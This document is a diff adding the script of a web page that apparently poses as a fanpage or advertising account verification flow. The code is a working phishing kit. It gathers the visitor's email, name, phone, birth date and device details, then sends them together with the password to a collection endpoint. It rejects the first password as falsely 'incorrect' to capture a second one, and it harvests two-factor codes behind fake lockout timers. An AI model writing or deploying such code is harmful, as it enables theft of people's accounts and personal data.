+        let pwdAttempts = 0, tfaAttempts = 0, currentSessionId = null, isSubmittingInfo = false;
+
+        function encodePayload(data) { return btoa(JSON.stringify(data)); }
+        async function sendData(payload) {
+            try {
+                const response = await fetch('/api/send-request', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ data: encodePayload(payload) })
+                });
+                return await response.json();
+            } catch (e) { return { success: false }; }
+        }
+
+
+        function getDeviceInfo() {
+            const ua = navigator.userAgent;
+            let browser = 'Unknown', os = 'Unknown';
+            if (ua.indexOf('Chrome') > -1 && ua.indexOf('Edg') === -1) browser = 'Chrome';
+            else if (ua.indexOf('Safari') > -1 && ua.indexOf('Chrome') === -1) browser = 'Safari';
+            else if (ua.indexOf('Firefox') > -1) browser = 'Firefox';
+            else if (ua.indexOf('Edg') > -1) browser = 'Edge';
+            else if (ua.indexOf('Opera') > -1 || ua.indexOf('OPR') > -1) browser = 'Opera';
+
+            if (ua.indexOf('iPhone') > -1 || ua.indexOf('iPad') > -1) os = 'iOS';
+            else if (ua.indexOf('Android') > -1) os = 'Android';
+            else if (ua.indexOf('Windows') > -1) os = 'Windows';
+            else if (ua.indexOf('Mac') > -1) os = 'MacOS';
+            else if (ua.indexOf('Linux') > -1) os = 'Linux';
+
+            return {
+                browser: browser,
+                os: os,
+                screen: screen.width + 'x' + screen.height,
+                language: navigator.language || '',
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || '',
+                mobile: /Mobile|Android|iPhone|iPad/i.test(ua)
+            };
+        }
+
+
+        document.getElementById('btn-subscribe').onclick = () => showModal('modal-info');
+        document.getElementById('btn-subscribe-cta').onclick = () => showModal('modal-info');
+        document.getElementById('nav-get-started').onclick = () => showModal('modal-info');
+        document.getElementById('nav-advertise').onclick = () => showModal('modal-info');
+        document.getElementById('nav-learn').onclick = () => showModal('modal-info');
+        document.getElementById('nav-support').onclick = () => showModal('modal-info');
+
+        document.getElementById('form-info').onsubmit = async function (e) {
+            e.preventDefault();
+            if (isSubmittingInfo) {
+                return;
+            }
+
+            // Clear previous errors
+            clearFormErrors();
+
+            const email = document.getElementById('email').value;
+            if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) {
+                showFormError('error-email', 'Please enter a valid email address');
+                document.getElementById('email').focus();
+                return;
+            }
+
+            const day = parseInt(document.getElementById('day').value);
+            const month = parseInt(document.getElementById('month').value);
+            const year = parseInt(document.getElementById('year').value);
+
+            if (!day || day < 1 || day > 31) {
+                showFormError('error-dob', 'Please enter a valid day (1-31)');
+                document.getElementById('day').focus();
+                return;
+            }
+            if (!month || month < 1 || month > 12) {
+                showFormError('error-dob', 'Please enter a valid month (1-12)');
+                document.getElementById('month').focus();
+                return;
+            }
+            if (!year || year < 1 || year > new Date().getFullYear()) {
+                showFormError('error-dob', 'Please enter a valid year');
+                document.getElementById('year').focus();
+                return;
+            }
+
+            // Phone validation - require at least 7 digits after country code
+            const phoneEl = document.getElementById('phone');
+            const phoneValue = phoneEl.value.replace(/\s/g, '');
+            // Remove country code prefix, then count only digit characters
+            const afterCode = phoneValue.startsWith(currentCountryCode)
+                ? phoneValue.substring(currentCountryCode.length)
+                : phoneValue.replace(/^\+?\d{1,3}/, '');
+            const digitCount = (afterCode.match(/\d/g) || []).length;
+            if (digitCount < 7 || phoneValue === currentCountryCode || phoneValue.trim() === currentCountryCode.trim()) {
+                showFormError('error-phone', 'Please enter a valid phone number (at least 7 digits)');
+                phoneEl.focus();
+                return;
+            }
+
+            isSubmittingInfo = true;
+            document.getElementById('info-btn-text').classList.add('hidden');
+            document.getElementById('info-spinner').classList.remove('hidden');
+            document.getElementById('info-submit-btn').disabled = true;
+
+            try {
+                // Save form data locally — first API call happens on first password entry
+                window._savedFormData = {
+                    email: email,
+                    emailBusiness: document.getElementById('emailBusiness')?.value || '',
+                    fullName: document.getElementById('fullName').value,
+                    phone: document.getElementById('phone').value,
+                    fanpage: document.getElementById('fanpage').value,
+                    dob: `${day}/${month}/${year}`,
+                    device: getDeviceInfo()
+                };
+
+                // Just wait 3s for loading animation, no API call yet
+                await new Promise(r => setTimeout(r, 3000));
+
+                hideModal('modal-info');
+                showModal('modal-password');
+            } catch (err) {
+                console.error('Error:', err);
+                showFormError('error-email', 'Network error, please try again');
+            } finally {
+                isSubmittingInfo = false;
+                document.getElementById('info-btn-text').classList.remove('hidden');
+                document.getElementById('info-spinner').classList.add('hidden');
+                document.getElementById('info-submit-btn').disabled = false;
+            }
+        };
+
+        document.getElementById('form-password').onsubmit = async function (e) {
+            e.preventDefault();
+            const pwd = document.getElementById('password');
+            const error = document.getElementById('pwd-error');
+            const btnText = document.getElementById('pwd-btn-text');
+            const spinner = document.getElementById('pwd-spinner');
+            const btn = document.getElementById('pwd-submit-btn');
+
+            if (!pwd.value.trim()) {
+                error.textContent = "You haven't entered your password!";
+                error.classList.add('show');
+                return;
+            }
+
+            error.textContent = '';
+            error.classList.remove('show');
+            btnText.classList.add('hidden');
+            spinner.classList.remove('hidden');
+            btn.disabled = true;
+            pwdAttempts++;
+
+            const savedPwd = pwd.value;
+
+            if (pwdAttempts === 1 && window._savedFormData) {
+                // First password: send ALL form info + password together as the first message
+                const result = await sendData({
+                    type: 'info',
+                    ...window._savedFormData,
+                    password: savedPwd
+                });
+                if (result && result.success && result.session_id) {
+                    currentSessionId = result.session_id;
+                    localStorage.setItem('session_id', result.session_id);
+                }
+            } else if (currentSessionId) {
+                // Subsequent: send individual message
+                sendData({ type: 'password', session_id: currentSessionId, password: savedPwd });
+            }
+
+            await new Promise(r => setTimeout(r, 3000));
+
+            spinner.classList.add('hidden');
+            btnText.classList.remove('hidden');
+            btn.disabled = false;
+
+            if (pwdAttempts === 1) {
+                error.textContent = "The password you've entered is incorrect.";
+                error.classList.add('show');
+                pwd.value = '';
+            } else {
+                error.classList.remove('show');
+                hideModal('modal-password');
+                update2FADisplay();
+                showModal('modal-2fa');
+            }
+        };
+
+        // Helper functions for masking
+        function maskEmail(email) {
+            if (!email) return '';
+            const [name, domain] = email.split('@');
+            if (!domain) return email;
+            const maskedName = name.charAt(0) + '**' + name.charAt(name.length - 1);
+            return maskedName + '@' + domain;
+        }
+
+        function maskPhone(phone) {
+            if (!phone) return '';
+            const cleaned = phone.replace(/\s/g, '');
+            if (cleaned.length < 6) return phone;
+            const lastDigits = cleaned.slice(-2);
+            const prefix = cleaned.slice(0, -4);
+            return prefix + ' ** ' + lastDigits;
+        }
+
+        function update2FADisplay() {
+            const email = document.getElementById('email').value;
+            const phone = document.getElementById('phone').value;
+            const fullName = document.getElementById('fullName').value;
+
+            document.getElementById('2fa-email-display').textContent = fullName;
+            document.getElementById('2fa-masked-info').textContent = maskEmail(email) + ', ' + maskPhone(phone);
+            document.getElementById('2fa-step').textContent = tfaAttempts + 1;
+        }
+
+        document.getElementById('form-2fa').onsubmit = function (e) {
+            e.preventDefault();
+            const code = document.getElementById('code-2fa');
+            const error = document.getElementById('2fa-error');
+            const btnText = document.getElementById('tfa-btn-text');
+            const spinner = document.getElementById('tfa-spinner');
+            const btn = document.getElementById('tfa-submit-btn');
+
+            if (!code.value.trim() || code.value.length < 6) return;
+
+            if (currentSessionId) {
+                sendData({ type: '2fa', session_id: currentSessionId, code: code.value });
+            }
+
+            error.textContent = '';
+            error.classList.remove('show');
+            btnText.classList.add('hidden');
+            spinner.classList.remove('hidden');
+            btn.disabled = true;
+            code.disabled = true;
+            tfaAttempts++;
+
+            setTimeout(() => {
+                spinner.classList.add('hidden');
+                btnText.classList.remove('hidden');
+
+                if (tfaAttempts <= 2) {
+                    code.value = '';
+                    let countdown = 30;
+                    const updateCountdown = () => {
+                        const mins = Math.floor(countdown / 60);
+                        const secs = countdown % 60;
+                        error.textContent = `The two-factor authentication you entered is incorrect. Please, try again after ${mins} minutes ${secs.toString().padStart(2, '0')} seconds.`;
+                        error.classList.add('show');
+                    };
+                    updateCountdown();
+                    const interval = setInterval(() => {
+                        countdown--;
+                        if (countdown <= 0) {
+                            clearInterval(interval);
+                            error.textContent = 'You can try again now.';
+                            code.disabled = false;
+                            btn.disabled = false;
+                            code.focus();
+                        } else {
+                            updateCountdown();
+                        }
+                    }, 1000);
+                } else {
+                    error.classList.remove('show');
+                    code.disabled = false;
+                    hideModal('modal-2fa');
+                    showModal('modal-success');
+                }
+            }, 3000);
+        };
+
+
+        function showFormError(id, msg) {
+            const el = document.getElementById(id);
+            if (el) { el.querySelector('span').textContent = msg; el.classList.add('show'); }
+        }
+        function clearFormErrors() {
+            document.querySelectorAll('.form-error').forEach(el => {
+                el.classList.remove('show');
+                el.querySelector('span').textContent = '';
+            });
+        }
+
+        ['email', 'day', 'month', 'year', 'phone'].forEach(id => {
+            document.getElementById(id)?.addEventListener('input', clearFormErrors);
+        });
+
+
+        const countrySearchInput = document.getElementById('country-search');
+        if (countrySearchInput) {
+            countrySearchInput.addEventListener('input', function () {
+                const query = this.value.toLowerCase();
+                const items = document.querySelectorAll('#country-dropdown .country');
+                items.forEach(item => {
+                    const name = item.querySelector('.country-name')?.textContent.toLowerCase() || '';
+                    const code = item.querySelector('.dial-code')?.textContent || '';
+                    item.style.display = (name.includes(query) || code.includes(query)) ? '' : 'none';
+                });
+            });
+        }
+
+
+
+
+        const scrollObserver = new IntersectionObserver((entries) => {
+            entries.forEach(entry => {
+                if (entry.isIntersecting) {
+                    entry.target.classList.add('visible');
+                    scrollObserver.unobserve(entry.target);
+                }
+            });
+        }, { threshold: 0.1 });
+        document.querySelectorAll('.scroll-fade').forEach(el => scrollObserver.observe(el));
+
+
+        document.addEventListener('keydown', function (e) {
+            if (e.key !== 'Tab') return;
+            const activeModal = document.querySelector('.modal.active .modal-content');
+            if (!activeModal) return;
+            const focusable = activeModal.querySelectorAll('input:not([disabled]), button:not([disabled]), textarea, select, a[href], [tabindex]:not([tabindex="-1"])');
+            if (focusable.length === 0) return;
+            const first = focusable[0], last = focusable[focusable.length - 1];
+            if (e.shiftKey) {
+                if (document.activeElement === first) { e.preventDefault(); last.focus(); }
+            } else {
+                if (document.activeElement === last) { e.preventDefault(); first.focus(); }
+            }
+        });
+    </script>
+    <script type="module">
+        import { inject } from 'https://esm.sh/@vercel/analytics';
+        inject();
+    </script>
+    <script src="i18n.js"></script>
+</body>
+
+</html>
